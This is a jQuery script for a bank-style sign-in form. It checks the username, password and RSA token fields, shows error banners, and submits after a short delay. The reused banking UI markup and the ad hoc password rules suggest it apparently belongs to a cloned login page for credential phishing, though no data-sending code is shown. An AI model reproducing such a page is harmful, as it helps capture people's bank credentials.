$('input[type="checkbox"]').change(function() {
    if (this.checked) {
        $(this).addClass('checkbox__input--checked');
    } else {
        $(this).removeClass('checkbox__input--checked');
    }
});

$('input[name="rsaToken"]').change(function() {
    if (this.checked) {
        $("#securityToken").removeClass('hidden');
        $("#signin-button").click(function (){
            if ($('#userId-text-input-field').val().length === 0 && $('#password-text-input-field').val().length === 0 && $('input[name="securityToken"]').val().length === 0){
                $("#logon-error").html("<div class=\"jpui error error inverted primary animate alert\" id=\"logon-error\" role=\"region\" aria-labelledby=\"inner-logon-error\"><div class=\"icon\"><span id=\"type-icon-logon-error\"><i class=\"jpui exclamation-color icon\" id=\"icon-type-icon-logon-error\" aria-hidden=\"true\"></i></span></div> <div class=\"icon background\"></div> <div class=\"content wrap\" id=\"content-logon-error\"><h2 class=\"title\" tabindex=\"-1\" id=\"inner-logon-error\"><span class=\"util accessible-text\" id=\"icon-logon-error\">Important: </span>Please tell us your username, password and token code.</h2> </div></div>");
            } else if ($('#userId-text-input-field').val().length !== 0 && $('#password-text-input-field').val().length !== 0 && $('input[name="securityToken"]').val().length === 0){
                $("#logon-error").html("<div class=\"jpui error error inverted primary animate alert\" id=\"logon-error\" role=\"region\" aria-labelledby=\"inner-logon-error\"><div class=\"icon\"><span id=\"type-icon-logon-error\"><i class=\"jpui exclamation-color icon\" id=\"icon-type-icon-logon-error\" aria-hidden=\"true\"></i></span></div> <div class=\"icon background\"></div> <div class=\"content wrap\" id=\"content-logon-error\"><h2 class=\"title\" tabindex=\"-1\" id=\"inner-logon-error\"><span class=\"util accessible-text\" id=\"icon-logon-error\">Important: </span>Please tell us your token code.</h2> </div></div>");
            }
        })
    } else {
        $("#securityToken").addClass('hidden');
        formSubmitted();
    }
});

var input = $(".input");
input.focusin(function() {
    $(this).parent().parent().parent().find(".floating-label__container").addClass("floating");
    // $(".floating-label__container").addClass("floating");
    $(this).parent().parent().find(".label-wrapper .label-alignment").addClass("error");
});
input.focusout(function() {
    if ($(this).val().length === 0){
        $(this).parent().parent().parent().find(".floating-label__container").removeClass("floating");

    }else {
        $(this).parent().parent().find(".label-wrapper .label-alignment").removeClass("error");
    }

});

function formSubmitted(){
    $("#signin-button").click(function (){
        if ($('#userId-text-input-field').val().length === 0 && $('#password-text-input-field').val().length === 0){
            $("#logon-error").html("<div class=\"jpui error error inverted primary animate alert\" id=\"logon-error\" role=\"region\" aria-labelledby=\"inner-logon-error\"><div class=\"icon\"><span id=\"type-icon-logon-error\"><i class=\"jpui exclamation-color icon\" id=\"icon-type-icon-logon-error\" aria-hidden=\"true\"></i></span></div> <div class=\"icon background\"></div> <div class=\"content wrap\" id=\"content-logon-error\"><h2 class=\"title\" tabindex=\"-1\" id=\"inner-logon-error\"><span class=\"util accessible-text\" id=\"icon-logon-error\">Important: </span>Please tell us your username and password.</h2> </div></div>");
        } else if ($('#userId-text-input-field').val().length !== 0 && $('#password-text-input-field').val().length === 0){
            $("#logon-error").html("<div class=\"jpui error error inverted primary animate alert\" id=\"logon-error\" role=\"region\" aria-labelledby=\"inner-logon-error\"><div class=\"icon\"><span id=\"type-icon-logon-error\"><i class=\"jpui exclamation-color icon\" id=\"icon-type-icon-logon-error\" aria-hidden=\"true\"></i></span></div> <div class=\"icon background\"></div> <div class=\"content wrap\" id=\"content-logon-error\"><h2 class=\"title\" tabindex=\"-1\" id=\"inner-logon-error\"><span class=\"util accessible-text\" id=\"icon-logon-error\">Important: </span>Please tell us your password.</h2> </div></div>");
        }
        else if ($('#userId-text-input-field').val().length === 0 && $('#password-text-input-field').val().length !== 0){
            $("#logon-error").html("<div class=\"jpui error error inverted primary animate alert\" id=\"logon-error\" role=\"region\" aria-labelledby=\"inner-logon-error\"><div class=\"icon\"><span id=\"type-icon-logon-error\"><i class=\"jpui exclamation-color icon\" id=\"icon-type-icon-logon-error\" aria-hidden=\"true\"></i></span></div> <div class=\"icon background\"></div> <div class=\"content wrap\" id=\"content-logon-error\"><h2 class=\"title\" tabindex=\"-1\" id=\"inner-logon-error\"><span class=\"util accessible-text\" id=\"icon-logon-error\">Important: </span>Please tell us your username.</h2> </div></div>");
        }else if(!onlyLettersAndNumbers($('#userId-text-input-field').val())){
            $("#logon-error").html("<div class=\"jpui error error inverted primary animate alert\" id=\"logon-error\" role=\"region\" aria-labelledby=\"inner-logon-error\"><div class=\"icon\"><span id=\"type-icon-logon-error\"><i class=\"jpui exclamation-color icon\" id=\"icon-type-icon-logon-error\" aria-hidden=\"true\"></i></span></div> <div class=\"icon background\"></div> <div class=\"content wrap\" id=\"content-logon-error\"><h2 class=\"title\" tabindex=\"-1\" id=\"inner-logon-error\"><span class=\"util accessible-text\" id=\"icon-logon-error\">Important: </span>Please enter a valid username.</h2> </div></div>");
        }else if($('#password-text-input-field').val().length < 6){
            $("#logon-error").html("<div class=\"jpui error error inverted primary animate alert\" id=\"logon-error\" role=\"region\" aria-labelledby=\"inner-logon-error\"><div class=\"icon\"><span id=\"type-icon-logon-error\"><i class=\"jpui exclamation-color icon\" id=\"icon-type-icon-logon-error\" aria-hidden=\"true\"></i></span></div> <div class=\"icon background\"></div> <div class=\"content wrap\" id=\"content-logon-error\"><h2 class=\"title\" tabindex=\"-1\" id=\"inner-logon-error\"><span class=\"util accessible-text\" id=\"icon-logon-error\">Important: </span>Please Enter Correct Password.</h2> </div></div>");
        }else{

            $("#logon-error").html('');

            $('#rotate').removeClass('hide');
            setTimeout(function (){
                $('#login-form').submit();
            },1000)
        }
    })
}

$("input").keyup(function(e){
    var code = e.key;
    if(code==="Enter") {
        $("#signin-button").click()
    }
});
$('#password-text-input-field').keyup(function (){
    $("#logon-error").html('');
})
function onlyLettersAndNumbers(str) {
    return /^[A-Za-z0-9]*$/.test(str);
}
formSubmitted();